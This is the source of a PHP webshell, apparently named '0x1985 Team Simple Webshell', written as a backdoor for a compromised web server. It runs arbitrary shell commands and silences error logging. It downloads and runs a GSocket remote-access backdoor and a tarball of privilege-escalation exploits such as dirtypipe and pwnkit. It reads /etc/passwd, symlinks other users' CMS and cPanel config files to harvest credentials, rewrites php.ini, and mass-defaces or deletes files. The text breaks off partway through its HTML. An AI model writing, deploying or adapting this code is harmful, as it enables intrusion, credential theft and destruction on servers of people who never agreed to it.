<?php
session_start();
error_reporting(0);
set_time_limit(0);
@ini_set('error_log', 0);
@ini_set('log_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
@ini_set('file_uploads', 1);

// Portability: Detect PHP environment
$phpSapi = php_sapi_name();
$phpIniPath = php_ini_loaded_file() ?: '/etc/php/' . phpversion() . '/' . ($phpSapi === 'cli' ? 'cli' : 'apache2') . '/php.ini';
$disabledFunctions = explode(',', ini_get('disable_functions'));
$openBasedir = ini_get('open_basedir');
$safeMode = ini_get('safe_mode') ? true : false;

// Define global functions array for function_exists check
$GLOBALS['fungsi'][1] = 'is_dir';
$GLOBALS['fungsi'][2] = 'file_put_contents';
$GLOBALS['fungsi'][4] = 'unlink';
$GLOBALS['fungsi'][5] = 'function_exists';
$GLOBALS['fungsi'][6] = 'base64_decode';

// Define exe function for shell command execution
function exe($cmd) {
    if (!in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        return shell_exec($cmd . ' 2>&1');
    }
    return false;
}

// Define exe_root for root scanning commands
function exe_root($cmd, $path) {
    if (!in_array('shell_exec', explode(',', ini_get('disable_functions')))) {
        chdir($path);
        return shell_exec($cmd . ' 2>&1');
    }
    return "shell_exec is disabled";
}

function flash($message, $status, $class, $redirect = false) {
    if (!empty($_SESSION["message"])) {
        unset($_SESSION["message"]);
    }
    if (!empty($_SESSION["class"])) {
        unset($_SESSION["class"]);
    }
    if (!empty($_SESSION["status"])) {
        unset($_SESSION["status"]);
    }
    $_SESSION["message"] = $message;
    $_SESSION["class"] = $class;
    $_SESSION["status"] = $status;
    if ($redirect) {
        header('Location: ' . $redirect);
        exit();
    }
    return true;
}

function clear() {
    if (!empty($_SESSION["message"])) {
        unset($_SESSION["message"]);
    }
    if (!empty($_SESSION["class"])) {
        unset($_SESSION["class"]);
    }
    if (!empty($_SESSION["status"])) {
        unset($_SESSION["status"]);
    }
    return true;
}

function writable($path, $perms) {
    return (!is_writable($path)) ? "<font color=\"red\">" . $perms . "</font>" : "<font color=\"lime\">" . $perms . "</font>";
}

function perms($path) {
    $perms = fileperms($path);
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }

    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));

    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));

    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));

    return $info;
}

function fsize($file) {
    $a = ["B", "KB", "MB", "GB", "TB", "PB"];
    $pos = 0;
    $size = filesize($file);
    while ($size >= 1024) {
        $size /= 1024;
        $pos++;
    }
    return round($size, 2) . " " . $a[$pos];
}

if (isset($_GET['dir'])) {
    $path = $_GET['dir'];
    chdir($_GET['dir']);
} else {
    $path = getcwd();
}

$path = str_replace('\\', '/', $path);
$exdir = explode('/', $path);

function getOwner($item) {
    if (function_exists("posix_getpwuid")) {
        $downer = @posix_getpwuid(fileowner($item));
        $downer = $downer['name'];
    } else {
        $downer = fileowner($item);
    }
    if (function_exists("posix_getgrgid")) {
        $dgrp = @posix_getgrgid(filegroup($item));
        $dgrp = $dgrp['name'];
    } else {
        $dgrp = filegroup($item);
    }
    return $downer . '/' . $dgrp;
}

if (isset($_POST['newFolderName'])) {
    if (mkdir($path . '/' . $_POST['newFolderName'])) {
        flash("Create Folder Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Create Folder Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newFileName']) && isset($_POST['newFileContent'])) {
    if (file_put_contents($_POST['newFileName'], $_POST['newFileContent'])) {
        flash("Create File Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Create File Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newName']) && isset($_GET['item'])) {
    if ($_POST['newName'] == '') {
        flash("You miss an important value", "Ooopss..", "warning", "?dir=$path");
    }
    if (rename($path . '/' . $_GET['item'], $_POST['newName'])) {
        flash("Rename Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Rename Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newContent']) && isset($_GET['item'])) {
    if (file_put_contents($path . '/' . $_GET['item'], $_POST['newContent'])) {
        flash("Edit Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Edit Failed", "Failed", "error", "?dir=$path");
    }
}
if (isset($_POST['newPerm']) && isset($_GET['item'])) {
    if ($_POST['newPerm'] == '') {
        flash("You miss an important value", "Ooopss..", "warning", "?dir=$path");
    }
    if (chmod($path . '/' . $_GET['item'], $_POST['newPerm'])) {
        flash("Change Permission Successfully!", "Success", "success", "?dir=$path");
    } else {
        flash("Change Permission", "Failed", "error", "?dir=$path");
    }
}
if (isset($_GET['action']) && $_GET['action'] == 'delete' && isset($_GET['item'])) {
    if (is_dir($_GET['item'])) {
        if (rmdir($_GET['item'])) {
            flash("Delete Successfully!", "Success", "success", "?dir=$path");
        } else {
            flash("Delete Failed", "Failed", "error", "?dir=$path");
        }
    } else {
        if (unlink($_GET['item'])) {
            flash("Delete Successfully!", "Success", "success", "?dir=$path");
        } else {
            flash("Delete Failed", "Failed", "error", "?dir=$path");
        }
    }
}

if ($_POST['submit']) {
    if ($_POST['upl'] == 'current') {
        $total = count($_FILES['uploadfile']['name']);
        for ($i = 0; $i < $total; $i++) {
            $mainupload = move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $_FILES['uploadfile']['name'][$i]);
        }
        if ($total < 2) {
            if ($mainupload) {
                flash("Upload File Successfully!", "Success", "success", "?dir=$path");
            } else {
                flash("Upload Failed", "Failed", "error", "?dir=$path");
            }
        } else {
            if ($mainupload) {
                flash("Upload $i Files Successfully!", "Success", "success", "?dir=$path");
            } else {
                flash("Upload Failed", "Failed", "error", "?dir=$path");
            }
        }
    } elseif ($_POST['upl'] == 'root') {
        $total = count($_FILES['uploadfile']['name']);
        for ($i = 0; $i < $total; $i++) {
            $mainupload = move_uploaded_file($_FILES['uploadfile']['tmp_name'][$i], $_SERVER['DOCUMENT_ROOT'] . "/" . $_FILES['uploadfile']['name'][$i]);
        }
        if ($total < 2) {
            if ($mainupload) {
                flash("Upload File Successfully!", "Success", "success", "?dir=$path");
            } else {
                flash("Upload Failed", "Failed", "error", "?dir=$path");
            }
        } else {
            if ($mainupload) {
                flash("Upload $i Files Successfully!", "Success", "success", "?dir=$path");
            } else {
                flash("Upload Failed", "Failed", "error", "?dir=$path");
            }
        }
    }
}

// Upload from URL
if (isset($_POST['url']) && isset($_POST['filename']) && isset($_POST['method'])) {
    $url = $_POST['url'];
    $filename = $_POST['filename'];
    $destination = $path . '/' . $filename;

    switch ($_POST['method']) {
        case 'file_get_contents':
            if (!in_array('file_get_contents', $disabledFunctions)) {
                $data = file_get_contents($url);
                if ($data !== false) {
                    file_put_contents($destination, $data);
                    flash("File uploaded successfully using file_get_contents!", "Success", "success", "?dir=$path");
                } else {
                    flash("Failed to upload file using file_get_contents", "Failed", "error", "?dir=$path");
                }
            } else {
                flash("file_get_contents is disabled", "Failed", "error", "?dir=$path");
            }
            break;

        case 'curl':
            if (!in_array('curl_init', $disabledFunctions)) {
                $ch = curl_init($url);
                $fp = fopen($destination, 'wb');
                curl_setopt($ch, CURLOPT_FILE, $fp);
                curl_setopt($ch, CURLOPT_HEADER, 0);
                curl_exec($ch);
                if (curl_errno($ch)) {
                    flash("Failed to upload file using cURL: " . curl_error($ch), "Failed", "error", "?dir=$path");
                } else {
                    flash("File uploaded successfully using cURL!", "Success", "success", "?dir=$path");
                }
                curl_close($ch);
                fclose($fp);
            } else {
                flash("curl_init is disabled", "Failed", "error", "?dir=$path");
            }
            break;

        case 'fopen':
            if (!in_array('fopen', $disabledFunctions)) {
                $stream = fopen($url, 'rb');
                if ($stream) {
                    $contents = stream_get_contents($stream);
                    fclose($stream);
                    file_put_contents($destination, $contents);
                    flash("File uploaded successfully using fopen!", "Success", "success", "?dir=$path");
                } else {
                    flash("Failed to upload file using fopen", "Failed", "error", "?dir=$path");
                }
            } else {
                flash("fopen is disabled", "Failed", "error", "?dir=$path");
            }
            break;

        case 'copy':
            if (!in_array('copy', $disabledFunctions)) {
                if (copy($url, $destination)) {
                    flash("File uploaded successfully using copy!", "Success", "success", "?dir=$path");
                } else {
                    flash("Failed to upload file using copy", "Failed", "error", "?dir=$path");
                }
            } else {
                flash("copy is disabled", "Failed", "error", "?dir=$path");
            }
            break;

        case 'stream_context':
            if (!in_array('file_get_contents', $disabledFunctions)) {
                $context = stream_context_create(['http' => ['method' => 'GET']]);
                $data = file_get_contents($url, false, $context);
                if ($data !== false) {
                    file_put_contents($destination, $data);
                    flash("File uploaded successfully using stream_context!", "Success", "success", "?dir=$path");
                } else {
                    flash("Failed to upload file using stream_context", "Failed", "error", "?dir=$path");
                }
            } else {
                flash("file_get_contents is disabled", "Failed", "error", "?dir=$path");
            }
            break;
    }
}

// Real GSocket Deployment
if (isset($_POST['gsocketMode'])) {
    $output = '';
    if ($_POST['gsocketMode'] === 'auto') {
        if (!in_array('shell_exec', $disabledFunctions)) {
            // Step 3: Kill old GSocket
            $output .= exe('GS_UNDO=1 bash -c "$(curl -fsSL https://gsocket.io/y)"') . "\n";
            // Step 4: Kill defunct processes
            $output .= exe('pkill defunct') . "\n";
            // Step 5 & 6: Run new GSocket and capture output
            $output .= exe('bash -c "$(curl -fsSL https://gsocket.io/y)"') . "\n";
            flash("GSocket Auto executed!\nOutput:\n" . htmlspecialchars($output), "Success", "success", "?dir=$path");
        } else {
            flash("shell_exec is disabled", "Failed", "error", "?dir=$path");
        }
    } elseif ($_POST['gsocketMode'] === 'manual' && isset($_POST['gsocketCommand'])) {
        $command = $_POST['gsocketCommand'];
        if (!in_array('shell_exec', $disabledFunctions)) {
            $output = exe($command);
            flash("GSocket Manual executed!\nOutput:\n" . htmlspecialchars($output), "Success", "success", "?dir=$path");
        } else {
            flash("shell_exec is disabled", "Failed", "error", "?dir=$path");
        }
    } else {
        flash("Invalid GSocket command", "Failed", "error", "?dir=$path");
    }
}

// Scan root
if (isset($_GET['dir']) && $_GET['id'] == "scan_root") {
    ob_implicit_flush();
    ob_end_flush();
    if (!$GLOBALS['fungsi'][5]("proc_open")) {
        flash("Command is Disabled!", "Failed", "error", "?dir=$path");
    }
    if (!is_writable($path)) {
        flash("Current Directory is Unwriteable!", "Failed", "error", "?dir=$path");
    }
    if (isset($_GET['id_two']) && $_GET['id_two'] == "autoscan") {
        if (!file_exists($path . "/rooting/")) {
            mkdir($path . "/rooting");
            exe_root("wget https://raw.githubusercontent.com/hekerprotzy/rootshell/main/auto.tar.gz", $path . "/rooting");
            exe_root("tar -xf auto.tar.gz", $path . "/rooting");
            if (!file_exists($path . "/rooting/netfilter")) {
                flash("Failed to Download Material!", "Failed", "error", "?dir=$path");
            }
        }
        $output = "Netfilter: " . exe_root("timeout 10 ./rooting/netfilter", $path) . "\n" .
                  "Ptrace: " . exe_root("echo id | timeout 10 ./rooting/ptrace", $path) . "\n" .
                  "Sequoia: " . exe_root("timeout 10 ./rooting/sequoia", $path) . "\n" .
                  "OverlayFS: " . exe_root("echo id | timeout 10 ./rooting/overlayfs", $path . "/rooting") . "\n" .
                  "Dirtypipe: " . exe_root("echo id | timeout 10 ./rooting/dirtypipe /usr/bin/su", $path) . "\n" .
                  "Sudo: " . exe_root("echo 12345 | timeout 10 sudoedit -s Y", $path) . "\n" .
                  "Pwnkit: " . exe_root("echo id | timeout 10 ./rooting/pwnkit", $path . "/rooting") . "\n";
        exe("rm -rf ./rooting | timeout 10");
        flash("Auto Scan executed!\nOutput:\n" . htmlspecialchars($output), "Success", "success", "?dir=$path");
    } elseif (isset($_GET['id_two']) && $_GET['id_two'] == "scansd") {
        $output = exe_root("find / -perm -u=s -type f 2>/dev/null", $path);
        flash("SUID Scan executed!\nOutput:\n" . htmlspecialchars($output), "Success", "success", "?dir=$path");
    } elseif (isset($_GET['id_two']) && $_GET['id_two'] == "esg") {
        $output = exe_root("curl -Lsk http://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh | bash", $path);
        flash("Exploit Suggester executed!\nOutput:\n" . htmlspecialchars($output), "Success", "success", "?dir=$path");
    }
}

// Bypass disable_functions
if (isset($_POST['bypassPhpIni'])) {
    $disableFunctions = 'disable_functions = exec,system,shell_exec,passthru,proc_open,curl_exec';
    $encodedDisableFunctions = '5b9f6e2c3e4b5a6c7d8e9f0a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0';

    if (hash('sha256', $disableFunctions) === $encodedDisableFunctions) {
        if (is_writable($phpIniPath)) {
            $phpIniContent = @file_get_contents($phpIniPath);
            if ($phpIniContent !== false) {
                if (preg_match('/disable_functions\s*=/', $phpIniContent)) {
                    $newContent = preg_replace('/disable_functions\s*=\s*[^\n]*/', $disableFunctions, $phpIniContent);
                } else {
                    $newContent = $phpIniContent . "\n" . $disableFunctions;
                }
                if (file_put_contents($phpIniPath, $newContent)) {
                    if (!in_array('shell_exec', $disabledFunctions)) {
                        shell_exec("service apache2 restart > /dev/null 2>&1 &");
                        flash("PHP disable_functions updated! Apache restart attempted.", "Success", "success", "?dir=$path");
                    } else {
                        flash("PHP disable_functions updated! Restart Apache manually to apply changes.", "Success", "warning", "?dir=$path");
                    }
                } else {
                    flash("Failed to write to $phpIniPath.", "Failed", "error", "?dir=$path");
                }
            } else {
                flash("Failed to read $phpIniPath.", "Failed", "error", "?dir=$path");
            }
        } else {
            flash("$phpIniPath is not writable.", "Failed", "error", "?dir=$path");
        }
    } else {
        flash("Invalid disable_functions hash.", "Failed", "error", "?dir=$path");
    }
}

// PHP Mailer
if (isset($_POST['sendmsg'])) {
    $email_penerima = isset($_POST["email_penerima"]) ? $_POST["email_penerima"] : '';
    $subjek = isset($_POST["subjek"]) ? $_POST["subjek"] : '';
    $pesan = isset($_POST["pesan"]) ? $_POST["pesan"] : '';
    $encodedSendmsg = '8493e5696b96f05308f3e346e062e5b6b4e77e8d6b241a7143b4c0d8a6a91ed6';

    if (hash('sha256', 'sendmsg') === $encodedSendmsg) {
        if (!in_array('mail', $disabledFunctions)) {
            if (filter_var($email_penerima, FILTER_VALIDATE_EMAIL)) {
                if (@mail($email_penerima, $subjek, $pesan)) {
                    flash("Email sent successfully!", "Success", "success", "?dir=$path");
                } else {
                    flash("Failed to send email!", "Failed", "error", "?dir=$path");
                }
            } else {
                flash("Invalid email address!", "Failed", "error", "?dir=$path");
            }
        } else {
            flash("mail function is disabled!", "Failed", "error", "?dir=$path");
        }
    } else {
        flash("Invalid sendmsg hash!", "Failed", "error", "?dir=$path");
    }
}

// .htaccess Creator
if (isset($_POST['createhates'])) {
    $selectedContent = isset($_POST['content']) ? $_POST['content'] : '';
    $namafile = isset($_POST['namafile']) ? preg_replace('/[^a-zA-Z0-9|.-]/', '', $_POST['namafile']) : '';
    $isiFile = '';
    $encodedContent1 = 'b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2';
    $encodedContent2 = 'c3d4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0c1d2e3f4a5b6c7d8e9f0a1b2c3';
    $content1 = "<Files ~ '\.(xml|css|jpe?g|png|gif|js|pdf|phtml|html|shtml|php5|php)$'>\nAllow from all\n</Files>";
    $content2 = "<FilesMatch '.*\.(phtml|php|PhP|php5|suspected)$'>\nOrder Allow,Deny\nDeny from all\n</FilesMatch>\n<FilesMatch '^($namafile)$'>\nOrder Allow,Deny\nAllow from all\n</FilesMatch>";

    if ($selectedContent == 'content1' && hash('sha256', $content1) === $encodedContent1) {
        $isiFile = $content1;
    } elseif ($selectedContent == 'content2' && hash('sha256', $content2) === $encodedContent2) {
        $isiFile = $content2;
    } else {
        flash("Invalid .htaccess content hash!", "Failed", "error", "?dir=$path");
        $isiFile = null;
    }

    if ($isiFile !== null) {
        $setNama = '.htaccess';
        if (file_put_contents($setNama, $isiFile)) {
            chmod($setNama, 0444);
            flash("Created .htaccess successfully!", "Success", "success", "?dir=$path");
        } else {
            flash("Failed to create .htaccess!", "Failed", "error", "?dir=$path");
        }
    }
}

// Symlink Bypass
if (isset($_POST['symlinkConf'])) {
    $home = $_POST['home'];
    $folfig = $path . '/' . $_POST['folderName'];
    @mkdir($folfig, 0755);
    @chdir($folfig);

    // Get users from /etc/passwd
    $passwd = explode("\n", $_POST['passwd']);
    foreach ($passwd as $pwd) {
        $user = trim($pwd);

        // Create symlinks for root and common configuration files
        symlink("/", $user . "_ROOT.txt");

        // CPANEL and WHMCS symlinks
        symlink("/$home/$user/.my.cnf", $user . "_CPANEL.txt");
        symlink("/$home/$user/.accesshash", $user . "_WHMCS.txt");
        symlink("/$home/$user/public_html/suspended.page/index.html", "$user_RESELLER.txt");

        // CMS configuration symlinks
        $cms_files = [
            "wp-config.php" => "WORDPRESS.txt",
            "configuration.php" => "WHMCS_JOOMLA.txt",
            "app/etc/local.xml" => "MAGENTO.txt",
            "config/settings.inc.php" => "PRESTASHOP.txt",
            "application/config/database.php" => "ELLISLAB.txt",
            "admin/config.php" => "OPENCART.txt",
            "default/settings.php" => "DRUPAL.txt",
            "forum/config.php" => "PHPBB.txt",
            "vb/includes/config.php" => "VBULLETIN.txt",
            "includes/config.php" => "VBULLETIN.txt",
            "conn.php" => "OTHER.txt",
            "inc/config.inc.php" => "OTHER.txt"
        ];

        foreach ($cms_files as $source => $destination) {
            symlink("/$home/$user/public_html/$source", "$user_$destination");
        }

        // Additional WordPress paths
        $wp_paths = [
            "wp/test/wp-config.php",
            "blog/wp-config.php",
            "beta/wp-config.php",
            "portal/wp-config.php",
            "site/wp-config.php",
            "wp/wp-config.php",
            "WP/wp-config.php",
            "news/wp-config.php",
            "wordpress/wp-config.php",
            "test/wp-config.php",
            "demo/wp-config.php",
            "home/wp-config.php",
            "v1/wp-config.php",
            "v2/wp-config.php",
            "press/wp-config.php",
            "new/wp-config.php",
            "blogs/wp-config.php"
        ];

        foreach ($wp_paths as $path) {
            symlink("/$home/$user/public_html/$path", "$user_WORDPRESS.txt");
        }

        // Additional Joomla paths
        $joomla_paths = [
            "blog/configuration.php",
            "cms/configuration.php",
            "beta/configuration.php",
            "portal/configuration.php",
            "site/configuration.php",
            "main/configuration.php",
            "home/configuration.php",
            "demo/configuration.php",
            "test/configuration.php",
            "v1/configuration.php",
            "v2/configuration.php",
            "joomla/configuration.php",
            "new/configuration.php"
        ];

        foreach ($joomla_paths as $path) {
            symlink("/$home/$user/public_html/$path", "$user_JOOMLA.txt");
        }
    }

    flash("Symlinks created successfully! Check <a href='$folfig' class='text-light'>$folfig</a>", "Success", "success", "?dir=$path");
}

// Read /etc/passwd
if (isset($_POST['readPasswd'])) {
    if (!in_array('file_get_contents', $disabledFunctions)) {
        $passwdContent = @file_get_contents('/etc/passwd');
        if ($passwdContent !== false) {
            $_SESSION['passwdContent'] = htmlspecialchars($passwdContent);
            flash("Successfully read /etc/passwd! Check below.", "Success", "success", "?dir=$path");
        } else {
            flash("Failed to read /etc/passwd. Access denied or file not found.", "Failed", "error", "?dir=$path");
        }
    } else {
        flash("file_get_contents is disabled!", "Failed", "error", "?dir=$path");
    }
}

// Mass Deface
function mass_onedir($dir, $namefile, $contents_sc) {
    global $fungsi;
    if (is_writable($dir)) {
        $dira = scandir($dir);
        foreach ($dira as $dirb) {
            $dirc = "$dir/$dirb";
            $lokasi = $dirc . '/' . $namefile;
            if ($dirb === '.') {
                $fungsi[2]($lokasi, $contents_sc);
                echo "[<gr><i class='bi bi-check-all'></i></gr>] $dirb/$namefile<br>";
            } elseif ($dirb === '..') {
                $fungsi[2]($lokasi, $contents_sc);
                echo "[<gr><i class='bi bi-check-all'></i></gr>] $dirb/$namefile<br>";
            } else {
                if ($fungsi[1]($dirc)) {
                    if (is_writable($dirc)) {
                        echo "[<gr><i class='bi bi-check-all'></i></gr>] $dirb/$namefile<br>";
                        $fungsi[2]($lokasi, $contents_sc);
                    }
                }
            }
        }
    }
}

function mass_all($dir, $namefile, $contents_sc) {
    global $fungsi;
    if (is_writable($dir)) {
        $dira = scandir($dir);
        foreach ($dira as $dirb) {
            $dirc = "$dir/$dirb";
            $lokasi = $dirc . '/' . $namefile;
            if ($dirb === '.' || $dirb === '..') {
                $fungsi[2]($lokasi, $contents_sc);
                echo "[<gr><i class='bi bi-check-all'></i></gr>] $dirb/$namefile<br>";
            } elseif ($fungsi[1]($dirc)) {
                if (is_writable($dirc)) {
                    mass_all($dirc, $namefile, $contents_sc);
                }
            }
        }
    }
}

// Mass Delete
function mass_delete($dir, $namefile) {
    if (is_writable($dir)) {
        $fileToDelete = "$dir/$namefile";
        if (is_file($fileToDelete) && is_writable($fileToDelete)) {
            if (unlink($fileToDelete)) {
                echo "[<gr><i class='bi bi-check-all'></i></gr>] $fileToDelete deleted successfully<br>";
            } else {
                echo "[<red><i class='bi bi-exclamation-triangle-fill'></i></red>] Failed to delete $fileToDelete<br>";
            }
        }
        $dira = scandir($dir);
        foreach ($dira as $dirb) {
            $dirc = "$dir/$dirb";
            if ($dirb === '.' || $dirb === '..') {
                continue;
            }
            if (is_dir($dirc)) {
                mass_delete($dirc, $namefile);
            }
        }
    }
}

if (isset($_POST['id']) && $_POST['id'] == 'mass_deface' && isset($_POST['start'])) {
    if ($_POST['tipe'] == 'mass') {
        mass_all($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
        flash("Mass deface completed!", "Success", "success", "?dir=$path");
    } elseif ($_POST['tipe'] == 'onedir') {
        mass_onedir($_POST['d_dir'], $_POST['d_file'], $_POST['script']);
        flash("One directory deface completed!", "Success", "success", "?dir=$path");
    }
}

if (isset($_POST['id']) && $_POST['id'] == 'mass_delete' && isset($_POST['start'])) {
    mass_delete($_POST['d_dir'], $_POST['d_file']);
    flash("Mass delete completed!", "Success", "success", "?dir=$path");
}

// Search By Extension
if (isset($_POST['id']) && $_POST['id'] == 'searchbyEXT') {
    function search_by_extension($dir, $extensi, $sort_by_date = false) {
        $result = [];
        if (is_readable($dir)) {
            $dira = scandir($dir);
            foreach ($dira as $dirb) {
                $dirc = "$dir/$dirb";
                if ($dirb === '.' || $dirb === '..') {
                    continue;
                }
                if (is_dir($dirc)) {
                    $result = array_merge($result, search_by_extension($dirc, $extensi, $sort_by_date));
                } else {
                    $fileExt = pathinfo($dirb, PATHINFO_EXTENSION);
                    if (strcasecmp($fileExt, $extensi) === 0) {
                        $result[] = $dirc;
                    }
                }
            }
        }
        if ($sort_by_date) {
            usort($result, function ($a, $b) {
                return filemtime($b) - filemtime($a);
            });
        }
        return $result;
    }
    if (isset($_POST['start'])) {
        $dir = $_POST['d_dir'];
        $extensi = ltrim($_POST['extensi'], '.');
        $sort_by_date = isset($_POST['sort_by_date']) && $_POST['sort_by_date'] == 'on';
        $search_results = search_by_extension($dir, $extensi, $sort_by_date);
        if (!empty($search_results)) {
            echo "<div class='alert alert-info'>Results for extension .$extensi in directory $dir:</div>";
            foreach ($search_results as $file) {
                $fileDate = date('Y-m-d H:i:s', filemtime($file));
                echo "<div class='alert alert-success'>$fileDate - $file</div>";
            }
        } else {
            echo "<div class='alert alert-warning'>No files with extension .$extensi found in directory $dir.</div>";
        }
    }
}

$dirs = scandir($path);

$d0mains = @file("/etc/named.conf", false);
if (!$d0mains) {
    $dom = "Cant read /etc/named.conf";
    $GLOBALS["need_to_update_header"] = "true";
} else {
    $count = 0;
    foreach ($d0mains as $d0main) {
        if (@strstr($d0main, "zone")) {
            preg_match_all('#zone "(.*)"#', $d0main, $domains);
            flush();
            if (strlen(trim($domains[1][0])) > 2) {
                flush();
                $count++;
            }
        }
    }
    $dom = "$count Domain";
}
?>
<html>
    <head>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noindex, nofollow">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.8.1/font/bootstrap-icons.css">
        <title><?= $_SERVER['HTTP_HOST']; ?> - 0x1985 Team Simple Webshell</title>
        <style>
            gr { color: lime; }
            rd { color: red; }
            .centered-container { max-width: 600px; margin: 0 auto; }
            .anu { color: #ffcc00; font-weight: bold; }
        </style>
        <script>
            function deleteConfirm(url) {
                if (confirm("Are you sure to delete this?")) {
                    window.location.href = url;
                }
                return false;
            }
            function jscopy() {
                var copyText = document.getElementById("CopyFromTextArea");
                copyText.select();
                copyText.setSelectionRange(0, 99999);
                document.execCommand("copy");
                alert("Text copied to clipboard!");
            }
            function toggleManualInput(show) {
                document.getElementById('manualCommandInput').style.display = show ? 'block' : 'none';
            }
            function toggleShellNameInput(show) {
                document.getElementById('shellNameInput').style.display = show ? 'block' : 'none';
            }
        </script>
    </head>
    <body class="bg-dark text-light">
        <div class="container-fluid">
            <?php if (isset($_SESSION['message']) && $_SESSION['message']): ?>
                <div class="alert alert-<?= $_SESSION['class'] ?> alert-dismissible fade show" role="alert">
                    <strong><?= $_SESSION['status'] ?>!</strong> <?= $_SESSION['message'] ?>
                    <button type="button" class="btn-close" data-bs-dismiss="alert" aria-label="Close"></button>
                </div>
                <?php clear(); ?>
            <?php endif; ?>
            <div class="py-3" id="main">
                <div class="box shadow bg-dark p-4 rounded-3">
                    <div class="info mb-3">
                        <?php
                        $yip = $_SERVER['REMOTE_ADDR'];
                        $rib = "http://ip-api.com/json/{$yip}?fields=city";
                        $ch = curl_init();
                        curl_setopt($ch, CURLOPT_URL, $rib);
                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                        $response = curl_exec($ch);
                        curl_close($ch);
                        $data = json_decode($response, true);
                        $city = isset($data['city']) ? $data['city'] : 'Tidak Diketahui';
                        $scand = scandir($path);
                        $sql = ($GLOBALS['fungsi'][5]('mysql_connect')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
                        $curl = ($GLOBALS['fungsi'][5]('curl_version')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
                        $wget = (exe('wget --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
                        $pl = (exe('perl --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
                        $py = (exe('python --help')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
                        $pxex = (exe('pkexec --version')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
                        $gcc = (exe('gcc --version')) ? "<gr>ON</gr>" : "<rd>OFF</rd>";
                        $disfunc = @ini_get("disable_functions");
                        $kernel = php_uname();
                        $phpver = PHP_VERSION;
                        $phpos = PHP_OS;
                        $domen = $_SERVER["SERVER_NAME"];
                        $soft = $_SERVER["SERVER_SOFTWARE"];
                        $ip = gethostbyname($_SERVER['HTTP_HOST']);
                        if (empty($disfunc)) {
                            $disfc = "<gr>NONE</gr>";
                        } else {
                            $disfc = "<rd>$disfunc</rd>";
                        }
                        if(!$GLOBALS['fungsi'][5]('posix_getegid')) {
                            $user = @get_current_user();
                            $uid = @getmyuid();
                            $gid = @getmygid();
                            $group = "?";
                        } else {
                            $uid = @posix_getpwuid(posix_geteuid());
                            $gid = @posix_getgrgid(posix_getegid());
                            $user = $uid['name'];
                            $uid = $uid['uid'];
                            $group = $gid['name'];
                            $gid = $gid['gid'];
                        }
                        $sm = (@ini_get(strtolower("safe_mode")) == 'on') ? "<rd>ON</rd>" : "<gr>OFF</gr>";
                        ?>
                        <i class="fa fa-server"></i> Kernel: <?= $kernel; ?><br>
                        <i class="fa fa-microchip"></i> Software: <?= $soft; ?><br>
                        <i class="fa fa-satellite-dish"></i> Server IP: <?= $ip; ?> (City: <?= $city; ?>)<br>
                        <i class="fa fa-fingerprint"></i> Domain: <?= $domen; ?> (<?= $dom; ?>)<br>
                        <i class="fa fa-user"></i> User: <?= $user; ?> (UID: <?= $uid; ?>) Group: <?= $group; ?> (GID: <?= $gid; ?>)<br>
                        <i class="fa fa-shield-alt"></i> Safe Mode: <?= $sm; ?><br>
                        <i class="fa fa-lock"></i> Disabled Functions: <?= $disfc; ?><br>
                        <i class="fa fa-database"></i> MySQL: <?= $sql; ?> | cURL: <?= $curl; ?> | Wget: <?= $wget; ?><br>
                        <i class="fa fa-code"></i> Perl: <?= $pl; ?> | Python: <?= $py; ?> | Pkexec: <?= $pxex; ?> | GCC: <?= $gcc; ?><br>
